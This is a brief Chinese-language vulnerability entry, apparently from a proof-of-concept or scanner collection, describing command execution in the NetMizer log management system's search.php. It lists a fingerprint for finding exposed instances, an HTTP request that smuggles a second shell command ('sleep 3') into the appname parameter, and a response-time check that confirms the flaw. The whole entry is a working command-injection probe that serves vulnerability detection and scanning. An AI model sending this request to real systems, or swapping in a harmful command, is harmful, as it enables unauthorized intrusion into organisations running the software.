# NetMizer日志管理系统search.php存在命令执行漏洞

NetMizer ｜ 命令执行 ｜ —
- **指纹**：`title="NetMizer 日志管理系统"`
- **请求**：`GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1`
- **响应特征**：200 响应时间>=3s